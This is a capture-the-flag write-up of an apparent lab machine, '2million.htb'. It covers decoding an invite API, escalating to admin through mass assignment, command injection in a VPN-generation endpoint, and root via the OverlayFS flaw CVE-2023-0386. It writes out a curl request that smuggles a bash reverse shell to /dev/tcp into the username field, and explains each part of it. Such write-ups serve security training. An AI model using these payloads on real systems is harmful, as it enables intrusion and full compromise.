![](Assets/Pasted%20image%2020260317200144.png)

**Main Vectors:** API Mass Assignment (BOLA), Command Injection, OverlayFS PrivEsc (CVE-2023-0386)

---

## 1. Reconnaissance & Enumeration

Initial connectivity was verified via ICMP ping. We then launched a standard TCP enumeration using `nmap`:

![](Assets/Pasted%20image%2020260317200459.png)

```bash
sudo nmap -sV -sS <IP_SCAN>
```

![](Assets/Pasted%20image%2020260317200616.png)

After adding the target IP to our `/etc/hosts` file mapped to `2millon.htb`, we accessed the web application. Inspecting the source code revealed custom JavaScript containing obfuscated logic.

![](Assets/Pasted%20image%2020260317200854.png)

![](Assets/Pasted%20image%2020260317200920.png)

![](Assets/Pasted%20image%2020260317201747.png)

By analyzing and executing the decryption function found within the JS file, we uncovered a hidden API endpoint used for generating invite codes.

![](Assets/Pasted%20image%2020260317204652.png)

![](Assets/Pasted%20image%2020260317205445.png)

We queried this endpoint to obtain a Base64 encoded invite code:

```bash
curl -X POST http://2million.htb/api/v1/invite/generate
```

![](Assets/Pasted%20image%2020260317205622.png)

Decoding the response granted us a valid invite code, allowing us to register a new user account and authenticate into the plataform.

![](Assets/Pasted%20image%2020260317210045.png)

## 2. Vulnerability Discovery & API Abuse

With an active session, we began enumerating the `/api/v1/` structure. We discovered an administrative endpoint and attempted to interact with it by sending an empty JSON payload.

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
-H "Cookie: IN_YOUR_SEESION" \
-H "Content-Type: application/json" \
-d '{}'
```

>[!info] The "Missing Parameter" Technique
> Sending an empty JSON object "{}" is a classic API enumeration technique. It forces the backend to throw validation errors, often leaking the exact parameter names it expects (e.g., "Missing parameter: email").

![](Assets/Pasted%20image%2020260317212132.png)

Following the error leaks, we identified the `email` parameter. Repeating the process revealed another expected parameter: `is_admin`. Since this is a boolean field, we tested an API Mass Assignment (BOLA) attack to elevate our privileges:

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
-H "Cookie: NAME=VALUE" \
-H "Content-Type: application/json" \
-d '{"email": "test@test.com"}'
```

![](Assets/Pasted%20image%2020260317212632.png)

Lets try to the parameter is_admin = 1, most of those fields are boolean

![](Assets/Pasted%20image%2020260317212905.png)

This successfully updated our account to Administrator status unlocking the rest of the `/admin` endpoints.

## 3. Command Injection & Initial Access

As ab administrator, we discovered the VPN generation enpoint (`/api/v1/admin/vpn/generate`).
By sending an empty payload again, we leaked the required `username` parameter.

We suspected this endpoint passed the `username` directly into a system command to generate the `.ovpn` file. We tested for OS Command Injection by appending a Bash reverse shell payload:

![](Assets/Pasted%20image%2020260317214309.png)

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
     -H "Cookie: NAME=VALUE" \
     -H "Content-Type: application/json" \
     -d '{"username": "test"}'
```

![](Assets/Pasted%20image%2020260317214427.png)

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
     -H "Cookie: NAME=VALUE" \
     -H "Content-Type: application/json" \
     -d '{"username": "test; bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\""}'
```

>[!danger] Reverse Shell Anatomy Breakdown
> - `test;`: Terminates the expected username input to begin our injected command.
> - `bash -c`: Spawns a new bash instance to execute the following string.
> - `bash -i`: Forces the shell to be interactive (simulating a human user).
> - `>& /dev/tcp/<YOUR_IP>/4444`: Redirects standard output and standard error over a TCP socket to our attacking machine.
> - `0>&1`: Redirects standard input (0) to standard output (1), closing the loop so we can send commands through the same socket.

We caugh the reverse shell on our `netcat` listener. Upon gaining entry, we enumerated the `.env` files in the web directory, discovered hardcoded user credentials, and pivoted via SSH for a more stable connection, claiming the `user.txt` flag.

![](Assets/Pasted%20image%2020260317215732.png)

![](Assets/Pasted%20image%2020260317220227.png)

Then we can check if the user exist in `/etc/passwd` and make one ssh

![](Assets/Pasted%20image%2020260317220348.png)

## 4. Privilege Escalation

For the final escalation, we enumerated the system and found it vulnerable to **[CVE-2023-0386](https://github.com/xkaneiki/CVE-2023-0386.git)** (OverlayFS Privilege Escalation). 

To maintain OPSEC nad ensure a clean transferm we packaged the exploit files on our attacking machine:

``` bash
tar -czvf exploit.tar.gz Makefile exp.c fuse.c getshell.c ovlcap
```

We hosted the archive using a Python web server (`python3 -m http.server 80`), downloaded it to the victim machine, and extracted it:

![](Assets/Pasted%20image%2020260317222031.png)

```bash
tar -xzvf exploit.tar.gz
```

Following the exploit's compilation instructions (`make`), we executed the binary. The overlay filesystem vulnerability successfully granted us a root shell, allowing us to capture the `root.txt` flag and fully compromise the system.

![](Assets/Pasted%20image%2020260317225620.png)